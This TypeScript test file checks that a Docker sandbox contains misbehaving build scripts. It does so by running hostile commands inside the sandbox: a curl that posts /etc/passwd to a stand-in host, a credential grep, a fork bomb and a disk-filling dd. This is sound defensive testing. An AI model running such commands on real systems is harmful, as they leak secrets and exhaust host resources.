import { describe, expect, it, beforeAll, afterAll } from 'vitest';
import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { DockerDriver, type SandboxHandle } from '@mergecrew/sandbox-driver';

/**
 * Sandbox containment e2e (#564). Six scenarios run against a real
 * docker engine, asserting the hardening flags applied in #557 / #561
 * actually contain a misbehaving build script.
 *
 * **Gate.** Suite skips unless `MERGECREW_DOCKER_E2E=1` is set in the
 * environment. The default CI lane (typecheck / build / unit tests)
 * stays fast; this suite runs from the e2e-loop workflow or operator
 * `pnpm --filter @mergecrew/e2e-loop test` invocations.
 *
 * **Image.** Uses `node:20-bookworm-slim` by default — the supervisor
 * image is a superset, but this base image is available in any CI lane
 * without ghcr.io auth. Override with `MERGECREW_E2E_IMAGE=...`.
 */

const GATE = process.env.MERGECREW_DOCKER_E2E === '1';
const IMAGE = process.env.MERGECREW_E2E_IMAGE ?? 'node:20-bookworm-slim';

// Long timeouts: container cold start + image pull adds seconds.
const SCENARIO_TIMEOUT_MS = 60_000;

describe.skipIf(!GATE)('sandbox containment (DockerDriver)', () => {
  let driver: DockerDriver;
  let workspace: string;
  let handle: SandboxHandle;

  beforeAll(async () => {
    workspace = await fs.mkdtemp(path.join(os.tmpdir(), 'sandbox-e2e-'));
    driver = new DockerDriver({ defaultImage: IMAGE });
    handle = await driver.start({
      runId: 'e2e-containment',
      projectId: 'e2e-proj',
      organizationId: 'e2e-org',
      workspacePath: workspace,
      resources: { cpu: 1, memoryMb: 256, pids: 64, timeoutMs: 30_000 },
    });
  }, 120_000);

  afterAll(async () => {
    if (handle) await driver.stop(handle).catch(() => {});
    if (workspace) await fs.rm(workspace, { recursive: true, force: true });
  });

  it(
    'scenario 1: egress to a non-allowlisted host fails (--network none)',
    async () => {
      const r = await driver.exec(handle, {
        cmd: 'sh',
        args: ['-c', 'curl -sS --max-time 5 https://example.invalid -d @/etc/passwd 2>&1; echo exit=$?'],
      });
      expect(r.stdout).toMatch(/exit=[^0]/);
    },
    SCENARIO_TIMEOUT_MS,
  );

  it(
    'scenario 2: filesystem outside /workspace is not reachable',
    async () => {
      // The host workspace at /var/mergecrew/work/<other> isn't bind-mounted
      // into the container at all, so the path simply does not exist.
      const r = await driver.exec(handle, {
        cmd: 'sh',
        args: ['-c', 'cat /var/mergecrew/work/other/secret.txt 2>&1; echo exit=$?'],
      });
      expect(r.stdout).toMatch(/exit=[^0]/);
    },
    SCENARIO_TIMEOUT_MS,
  );

  it(
    'scenario 3: supervisor env (KMS_MASTER_KEY, GITHUB_APP_*) does not appear',
    async () => {
      const r = await driver.exec(handle, {
        cmd: 'sh',
        args: ['-c', 'env | grep -E "^(KMS_|GITHUB_APP_|AWS_|VERCEL_)" || echo NONE'],
      });
      expect(r.stdout.trim()).toBe('NONE');
    },
    SCENARIO_TIMEOUT_MS,
  );

  it(
    'scenario 4: fork bomb is contained by --pids-limit',
    async () => {
      // pids-limit was set to 64 in start(); a fork bomb hits the cap
      // within milliseconds. We don't assert it terminates the *sandbox*
      // (the orchestrator timeout would do that) — just that the host
      // doesn't melt and a sensible exit / signal comes back within the
      // per-call timeout below.
      const r = await driver.exec(handle, {
        cmd: 'sh',
        args: ['-c', ':(){ :|:& };: ; sleep 1; echo "shouldn-t-reach"'],
        timeoutMs: 5000,
      });
      expect(r.stdout).not.toContain('shouldn-t-reach');
    },
    SCENARIO_TIMEOUT_MS,
  );

  it(
    'scenario 5: large disk write is bounded by tmpfs / workspace size',
    async () => {
      // /tmp is a 512 MB tmpfs (from --tmpfs); a 20 GB dd into it must
      // fail before completing. We use a small `count` to keep the test
      // brisk but big enough to exceed any small allocation.
      const r = await driver.exec(handle, {
        cmd: 'sh',
        args: ['-c', 'dd if=/dev/zero of=/tmp/big bs=1M count=2000 2>&1; echo exit=$?'],
        timeoutMs: 30_000,
      });
      // Expect either non-zero exit or stderr containing "No space left".
      const ok = /exit=[^0]/.test(r.stdout) || /No space left/.test(r.stdout) || /No space left/.test(r.stderr);
      expect(ok).toBe(true);
    },
    SCENARIO_TIMEOUT_MS,
  );

  it(
    'scenario 6: container cannot bind to a host-reachable port (no host network)',
    async () => {
      // We don't try to *bind* (it might succeed inside the netns) — we
      // verify the host's supervisor port is unreachable from inside.
      // 9091 is the default RUNNER_HEALTH_PORT; the container has
      // --network none so even loopback to the host is unreachable.
      const r = await driver.exec(handle, {
        cmd: 'sh',
        args: ['-c', 'getent hosts host.docker.internal >/dev/null 2>&1 && echo HAVE_HOST || echo NO_HOST'],
      });
      expect(r.stdout.trim()).toBe('NO_HOST');
    },
    SCENARIO_TIMEOUT_MS,
  );
});
